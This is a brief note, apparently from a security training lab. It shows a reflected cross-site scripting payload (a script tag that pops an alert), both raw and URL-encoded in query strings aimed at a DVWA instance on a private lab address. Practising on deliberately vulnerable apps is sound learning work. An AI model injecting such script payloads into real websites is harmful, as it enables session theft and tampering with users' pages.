//Cross Site Scripting

<script>alert("H3ll0")</script>

// http://10.0.2.8/dvwa/vulnerabilities/xss_r/?name=<script>alert('H3ll0')</script>#
// http://10.0.2.8/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27H3ll0%27%29%3C%2Fscript%3E#